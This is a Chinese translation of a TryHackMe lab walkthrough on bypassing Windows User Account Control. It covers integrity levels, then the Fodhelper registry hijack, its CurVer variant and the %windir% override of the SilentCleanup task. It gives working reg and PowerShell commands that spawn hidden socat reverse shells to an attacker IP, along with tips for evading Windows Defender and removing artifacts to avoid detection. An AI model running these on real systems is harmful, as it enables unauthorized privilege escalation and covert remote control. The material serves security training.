Bypassing UAC - 绕过 UAC

了解在 Windows 主机中绕过用户帐户控制（UAC）的常见方法。

TryHackMe | Bypassing UAC

Introduction - 简介​

在本房间中，我们将探讨绕过 Windows 系统中名为 用户帐户控制（UAC） 的安全功能的常见方法。此功能允许任何进程以低权限运行，无论是普通用户还是管理员执行该进程。

从攻击者的角度来看，绕过 UAC 对于突破高度限制的环境并完全提升目标主机上的权限至关重要。在学习绕过技术的同时，我们还将关注可能触发的警报以及可能在目标系统上创建的痕迹，这些痕迹可能被蓝队检测到。

房间目标​

  • 学习攻击者绕过 UAC 的不同技术。

房间前置要求​

建议在学习本房间之前先完成 Windows Internals 房间的内容。

User Account Control (UAC) - 用户帐户控制（UAC）​

什么是 UAC？​

用户帐户控制（UAC）是 Windows 的一项安全功能，默认情况下强制任何新进程以非特权账户的安全上下文运行。此策略适用于任何用户启动的进程，包括管理员本人。其目的是，我们不能仅仅依赖用户身份来决定是否授权某些操作。

虽然这看起来可能违反直觉，但可以想象一个情况：用户 BOB 不知情地从互联网下载了一个恶意应用程序。如果 BOB 是管理员组的一部分，那么他启动的任何应用程序都会继承其访问令牌的权限。所以，如果 BOB 决定启动这个恶意应用程序，并且 UAC 被禁用，恶意应用程序将立即获得管理员权限。相反，当 UAC 启用时，恶意应用程序将被限制为非管理员访问令牌。

UAC 提升​

如果管理员需要执行特权任务，UAC 提供了一种提升权限的方法。提升的方式是通过向用户显示一个简单的对话框，以确认他们明确批准以管理员安全上下文运行应用程序：

完整性级别​

UAC 是 强制完整性控制（MIC），这是一种机制，通过为每个用户、进程和资源分配 完整性级别（IL），来区分它们。通常，拥有更高 IL 访问令牌的用户或进程将能够访问具有较低或相等 IL 的资源。MIC 优先于常规的 Windows DACL，因此根据 DACL，您可能被授权访问某个资源，但如果您的 IL 不够高，这并不重要。

Windows 使用以下 4 个 IL，按从低到高的顺序排列：

完整性级别用途
低通常用于与互联网的交互（例如 Internet Explorer）。权限非常有限。
中分配给标准用户和管理员的过滤令牌。
高如果启用了 UAC，则管理员的提升令牌使用此级别。如果 UAC 被禁用，所有管理员将始终使用高 IL 令牌。
系统保留给系统使用。

当一个进程需要访问某个资源时，它将继承调用用户的访问令牌及其相关的 IL。如果一个进程派生子进程，也会发生相同的情况。

过滤令牌​

为了实现角色的分离，UAC 在登录期间会以略有不同的方式对待普通用户和管理员：

  • 非管理员 在登录时将获得一个访问令牌，用于执行用户的所有任务。此令牌具有中等 IL。
  • 管理员 将获得两个访问令牌：
    • 过滤令牌： 删除了管理员权限的令牌，用于常规操作。此令牌具有中等 IL。
    • 提升令牌： 具有完全管理员权限的令牌，用于需要以管理员权限运行的任务。此令牌具有高 IL。

通过这种方式，管理员将使用其过滤令牌，除非他们通过 UAC 显式请求管理员权限。

以常规方式打开应用程序​

当尝试打开常规控制台时，我们可以选择以非特权用户身份或管理员身份打开。根据我们的选择，分配给启动进程的令牌将是中等 IL 或高 IL：

如果我们使用 Process Hacker 分析这两个进程，我们可以看到关联的令牌及其差异：

在左侧，您可以看到一个过滤令牌，具有中等 IL，并且几乎没有分配任何权限。在右侧，您可以看到该进程以高 IL 运行，并且具有更多可用的权限。另一个可能不那么明显的区别是，中等 IL 进程实际上被拒绝了与属于管理员组相关的任何权限。

UAC 设置​

根据我们的安全需求，UAC 可以配置为四种不同的通知级别：

  • 始终通知： 当更改 Windows 设置或程序尝试安装应用程序或对计算机进行更改时，通知并提示用户授权。
  • 仅当程序尝试更改我的计算机时通知我： 当程序尝试安装应用程序或对计算机进行更改时，通知并提示用户授权。管理员在更改 Windows 设置时不会被提示。
  • 仅当程序尝试更改我的计算机时通知我（不调暗桌面）： 与上面相同，但不会在安全桌面上运行 UAC 提示。
  • 从不通知： 禁用 UAC 提示。管理员将使用高权限令牌运行所有程序。

UAC 内部机制​

在 UAC 的核心，我们有 应用程序信息服务（Appinfo）。每当用户需要提升权限时，发生的过程如下：

  1. 用户请求以管理员身份运行一个应用程序。
  2. 通过 runas 动词发出一个 ShellExecute API 调用。
  3. 请求被转发到 Appinfo 以处理提升权限。
  4. 检查应用程序清单以确认是否允许自动提升（稍后会详细介绍）。
  5. Appinfo 执行 consent.exe，它会在 安全桌面 上显示 UAC 提示。安全桌面是一个独立的桌面，用于隔离进程，以避免其他进程以任何方式篡改 UAC 提示。
  6. 如果用户同意以管理员身份运行应用程序，Appinfo 服务将使用用户的提升令牌执行该请求。然后，Appinfo 将新进程的父进程 ID 设置为指向请求提升权限的 shell。

绕过 UAC​

从攻击者的角度来看，可能会有一些情况，你通过 Powershell 或 cmd.exe 获得了对 Windows 主机的远程 shell。你甚至可能通过一个属于管理员组的账户获得访问权限，但当你尝试为未来的访问创建一个后门用户时，却遇到以下错误：

有趣的是，微软并不认为 UAC 是一个安全边界，而只是一个方便管理员的工具，用于避免不必要地以管理员权限运行进程。从这个意义上讲，UAC 提示更多的是提醒用户他们正在以高权限运行，而不是阻止恶意软件或攻击者这样做。由于它不是一个安全边界，因此任何绕过技术都不被微软视为漏洞，因此其中一些技术至今仍未修复。

一般来说，大多数绕过技术依赖于我们能够利用一个高 IL 进程代表我们执行某些操作。由于任何由高 IL 父进程创建的进程都会继承相同的完整性级别，这足以让我们获得提升的令牌，而不需要经过 UAC 提示。

在本房间中介绍的所有场景中，我们假设我们通过管理员账户访问服务器，但只能从一个中等 IL 控制台进行操作。我们的目标始终是访问一个高 IL 控制台，而不经过 UAC。

UAC: Auto-Elevating Processes - UAC：自动提升权限的进程​

自动提升（AutoElevate）​

如前所述，某些可执行文件可以自动提升权限，从而在无需用户干预的情况下获得高完整性级别（High IL）。这适用于大多数控制面板功能以及 Windows 提供的一些可执行文件。

要实现自动提升，应用程序需要满足以下要求：

  • 可执行文件必须由 Windows Publisher 签名。
  • 可执行文件必须位于受信任的目录中，例如 %SystemRoot%/System32/ 或 %ProgramFiles%/。

根据应用程序的类型，可能还需满足其他要求：

  • 可执行文件（.exe）必须在其清单（manifest）中声明 autoElevate 元素。要检查文件的清单，可以使用 sigcheck，这是 Sysinternals 套件的一部分工具。你可以在计算机上的 C:\tools\ 目录中找到 sigcheck。如果我们检查 msconfig.exe 的清单，将会发现 autoElevate 属性：
C:\tools\> sigcheck64.exe -m c:/windows/system32/msconfig.exe
...
<asmv3:application>
	<asmv3:windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">
		<dpiAware>true</dpiAware>
		<autoElevate>true</autoElevate>
	</asmv3:windowsSettings>
</asmv3:application>

  • mmc.exe 会根据用户请求的 .msc 管理单元自动提升权限。Windows 附带的大多数 .msc 文件都会自动提升。

    Windows 还维护了一个额外的可执行文件列表，这些文件即使在清单中未声明也会自动提升。例如，该列表包括 pkgmgr.exe 和 spinstall.exe。

    COM 对象也可以通过配置某些注册表项来请求自动提升权限（参考链接）。

案例研究：Fodhelper​

Fodhelper.exe 是 Windows 的默认可执行文件之一，负责管理 Windows 的可选功能，包括额外语言、默认未安装的应用程序或其他操作系统特性。与大多数系统配置程序一样，Fodhelper 在使用默认的 UAC 设置时可以自动提升权限，以便管理员在执行标准管理任务时不会收到提升权限的提示。

虽然我们已经研究过一个具有 autoElevate 特性的可执行文件，但与 msconfig 不同，Fodhelper 无需访问图形用户界面（GUI）即可被滥用。

从攻击者的角度来看，这意味着 Fodhelper 可以通过中等完整性（Medium Integrity）的远程 shell 使用，并进一步升级为一个完全功能的高完整性（High Integrity）进程。

这一特定技术由 @winscripting 发现，并已被 Glupteba 恶意软件 在野外攻击中使用。

关于 Fodhelper 的一个关键发现是，它会在注册表中搜索一个特定的感兴趣键：

当 Windows 打开一个文件时，它会检查注册表以确定要使用的应用程序。注册表为每种文件类型保存了一个名为 Programmatic ID（ProgID）的键，该键将文件类型与相应的应用程序关联起来。

假设你尝试打开一个 HTML 文件。系统会检查名为 HKEY_CLASSES_ROOT 的注册表部分，以确定应使用你偏好的 Web 客户端来打开该文件。具体的命令会在每个文件的 ProgID 下的 shell/open/command 子键中指定。

以 "htmlfile" 的 ProgID 为例：

实际上，HKEY_CLASSES_ROOT 只是注册表中两个不同路径的合并视图：

路径描述
HKEY_LOCAL_MACHINE\Software\Classes系统范围的文件关联
HKEY_CURRENT_USER\Software\Classes当前用户的文件关联

在检查 HKEY_CLASSES_ROOT 时，如果在 HKEY_CURRENT_USER (HKCU) 中存在用户特定的关联，则该关联将优先使用。如果未配置用户特定的关联，则会改用 HKEY_LOCAL_MACHINE (HKLM) 中的系统范围关联。这样，每个用户都可以根据需要选择其偏好的应用程序。

回到 Fodhelper，我们现在看到它试图在 ms-settings ProgID 下打开一个文件。通过在当前用户的上下文中于 HKCU 下创建该 ProgID 的关联，我们将覆盖默认的系统范围关联，并因此控制用于打开该文件的命令。由于 Fodhelper 是一个 autoElevate 可执行文件，它启动的任何子进程都将继承高完整性令牌，从而有效地绕过 UAC。

清除痕迹​

由于执行了这个漏洞利用，目标系统上创建了一些注册表键作为遗留物。为了避免被检测到，我们需要使用以下命令进行清理：

reg delete HKCU\Software\Classes\ms-settings\ /f

注意：确保执行给定的命令，以避免任何遗留物干扰后续任务。

nc -lvp 4444

并修改漏洞利用，确保在设置注册表值后立即运行 fodhelper.exe。如果命令执行得足够快，它就会成功运行（确保根据需要替换你的 IP 地址）：

C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"

C:\> reg add %REG_KEY% /v "DelegateExecute" /d "" /f
The operation completed successfully.

C:\> reg add %REG_KEY% /d %CMD% /f & fodhelper.exe

根据运气的不同，fodhelper 可能会在防病毒软件启动之前执行，从而返回反向 shell。如果由于某些原因它没有成功运行，请记住这种方法并不可靠，因为它依赖于防病毒软件和你的有效载荷之间的竞态条件。如果反向 shell 没有工作，可以继续进行房间中的其他任务，因为接下来会提供一种更稳定的绕过 Windows Defender 的方法。

不过，Windows Defender 仍然会对绕过操作发出警报。我们当前漏洞利用的问题在于它缺乏变通余地，因为我们需要为触发漏洞利用而写入特定的注册表键，这使得 Windows Defender 容易检测到。但仍然可以采取一些措施来应对这个问题。

改进 Fodhelper 漏洞利用​

@V3ded 提出了一个改进版的 Fodhelper 漏洞利用方法，其中使用了不同的注册表键，但基本原理相同。

我们不再将有效载荷写入 HKCU\Software\Classes\ms-settings\Shell\Open\command，而是使用 progID 注册表键下的 CurVer 条目。当系统上运行多个不同版本的应用程序时，CurVer 条目允许指向默认的应用程序版本，以便 Windows 在打开特定文件类型时使用。

为此，我们将为一个新的 progID 创建一个注册表条目（名称可以自定），然后将 ms-settings progID 中的 CurVer 条目指向我们新创建的 progID。这样，当 Fodhelper 尝试使用 ms-settings progID 打开文件时，它会注意到 CurVer 条目指向我们的新 progID，并查看该条目以确定使用哪个命令。

@V3ded 提出的漏洞利用代码使用了 Powershell 来实现这一目的。以下是经过修改的版本，适用于我们的反向 shell（确保根据需要替换你的 IP 地址）：

$program = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"

New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force
    
New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force
    
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

这个漏洞利用创建了一个新的 progID，名为 .pwn，并将我们的有效载荷与打开此类文件时使用的命令关联。然后，它将 ms-settings 的 CurVer 条目指向我们创建的 .pwn progID。当 Fodhelper 尝试打开 ms-settings 程序时，它会被指向 .pwn progID，并使用其关联的命令。

这种技术更有可能躲避 Windows Defender，因为我们可以更自由地选择放置有效载荷的位置，因为包含有效载荷的 progID 名称是完全任意的。接下来，在攻击者的机器上启动一个新的反向 shell：

nc -lvp 4445

然后从我们的后门连接中按原样执行漏洞利用。结果，Windows Defender 会再次触发一个警报，提到我们的操作：

尽管我们仍然被检测到，但需要注意的是，有时候防病毒软件使用的检测方法是严格针对已发布的漏洞利用，而没有考虑可能的变种。如果我们将漏洞利用从 Powershell 转换为使用 cmd.exe，防病毒软件就不会发出任何警报（确保根据需要替换你的 IP 地址）：

C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"

C:\> reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
The operation completed successfully.

C:\> reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
The operation completed successfully.

C:\> fodhelper.exe

然后我们得到一个高权限的反向 shell：

user@kali$ nc -lvp 4445      
Listening on 0.0.0.0 4445
Connection received on 10.10.183.127 23441
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /groups | find "Label"
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288

要获取 fodhelper-curver 标志，请使用你的新 shell 执行：

C:\> C:\flags\GetFlag-fodhelper-curver.exe

注意：请记住，只有在你通过 fodhelper 成功绕过 UAC，并且仅从通过 socat 获取的高权限 shell 中执行时，才会返回标志。

清除痕迹​

由于执行了此漏洞利用，目标系统上产生了一些痕迹，例如注册表键。为了避免被检测到，我们需要使用以下命令清理自己的痕迹：

reg delete "HKCU\Software\Classes\.thm\" /f
reg delete "HKCU\Software\Classes\ms-settings\" /f

注意：请务必执行给定的命令，以避免任何痕迹干扰接下来的任务。

UAC: Environment Variable Expansion - UAC：环境变量扩展​

绕过始终通知​

如前所述，在默认的 Windows 配置中，你可以利用与系统配置相关的应用程序绕过 UAC，因为这些应用程序的大多数都在其清单中设置了 autoElevate 标志。然而，如果 UAC 配置为“始终通知”级别，fodhelper 和类似的应用程序将无法发挥作用，因为它们需要用户通过 UAC 提示进行提升。这将阻止多种已知的绕过方法，但并非没有解决办法。

对于以下技术，我们将利用一个计划任务，该任务可以由任何用户运行，但将以调用者可用的最高权限执行。计划任务是一个很有趣的目标。根据设计，计划任务是无用户交互的（与 UAC 安全级别无关），因此要求用户手动提升进程是不可能的。任何需要提升权限的计划任务将自动获得权限，而无需经过 UAC 提示。

案例研究：磁盘清理计划任务​

注意：请确保为此任务禁用 Windows Defender，否则在运行漏洞利用时可能会遇到一些困难。 只需在你机器的桌面上运行提供的快捷方式即可禁用它。

为了理解我们为什么选择磁盘清理，首先打开 任务计划程序 并检查任务的配置：

在这里，我们可以看到该任务被配置为以 Users 账户运行，这意味着它将继承调用用户的权限。使用最高权限运行 选项将使用调用用户可用的最高权限安全令牌，对于管理员来说，这是一个高完整性（high IL）令牌。需要注意的是，如果普通的非管理员用户调用此任务，它将以中等完整性（medium IL）运行，因为这是非管理员用户可用的最高权限令牌，因此绕过方法将无法生效。

检查 操作 和 设置 标签页，我们可以看到以下内容：

该任务可以按需运行，调用时执行以下命令：

%windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%

由于该命令依赖于环境变量，我们可能能够通过它们注入命令，并通过手动启动磁盘清理任务来执行这些命令。

幸运的是，我们可以通过在 HKCU\Environment 中创建条目，通过注册表覆盖 %windir% 变量。如果我们想通过 socat 执行反向 shell，可以按以下方式设置 %windir%（不带引号）：

"cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes &REM "

在命令的末尾，我们连接了“&REM ”（后面有一个空格），以注释掉在扩展环境变量时放置在 %windir% 后面的内容，从而获得 DiskCleanup 使用的最终命令。最终命令如下（确保在需要的地方替换为你的 IP 地址）：

cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes &REM \system32\cleanmgr.exe /autoclean /d %systemdrive%

在“REM”之后的内容会被忽略作为注释。

综合应用​

首先，我们设置一个反向 shell 的监听器： nc -lvp 4446

然后，连接到提供的后门，端口为 9999： nc 10.10.173.0 9999

最后，运行以下命令将我们的 payload 写入 %windir%，然后执行 DiskCleanup 任务（确保在需要的地方替换为你的 IP 地址）：

C:\> reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4446 EXEC:cmd.exe,pipes &REM " /f

C:\> schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I

最终，您将获得一个具有高完整性级别（IL）的shell：

user@kali$ nc -lvp 4446      
Listening on 0.0.0.0 4446
Connection received on 10.10.183.127 25631
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /groups | find "Label"
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288

要获取 DiskCleanup 标志，请使用您的新 shell 执行：

C:\flags\GetFlag-diskcleanup.exe

注意：请记住，标志只有在您成功通过 diskcleanup 绕过 UAC，并且仅通过 socat 从生成的高完整性 shell 中返回时，才会返回。

清理痕迹​

由于执行了此漏洞利用，一些痕迹在目标系统上被创建，例如注册表键。为了避免被检测到，我们需要使用以下命令清理痕迹：

reg delete "HKCU\Environment" /v "windir" /f

注意：请务必执行给定的命令，以避免任何痕迹干扰后续任务。由于许多 Windows 组件依赖于 %windir% 环境变量，直到您删除用于此绕过的注册表键，许多功能将无法正常工作。

自动化 UAC 绕过​

有一个非常有用的工具可以用来测试 UAC 绕过，而不需要从头开始编写利用代码。这个工具由 @hfiref0x 创建，名为 UACME，它提供了一个更新的 UAC 绕过技术库，可以直接使用。该工具可以从以下官方 GitHub 仓库下载：

https://github.com/hfiref0x/UACME

虽然 UACME 提供了多个工具，我们将主要关注其中的 Akagi，它负责执行实际的 UAC 绕过。你可以在 C:\tools\UACME-Akagi64.exe 路径下找到 Akagi 的编译版本。

使用该工具非常简单，只需要指定要测试的方法编号即可。项目的 GitHub 描述中提供了完整的方法列表。如果你想测试方法 33，你只需在命令提示符中运行以下命令，系统就会弹出一个高完整性权限的 cmd.exe：

Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\attacker>cd /tools

C:\tools>UACME-Akagi64.exe 33

Conclusion - 结论​

我们在本任务中展示了几种绕过 Windows 系统 UAC 的方法。虽然大多数方法都有自动化工具，但如果直接使用这些工具，它们很容易被市场上的任何防病毒解决方案检测到。了解实际的绕过方法将帮助攻击者定制自己的攻击工具，使其更加隐蔽。

正如我们所看到的，UAC 并不被认为是一个安全边界，因此它容易受到多种绕过方法的攻击。
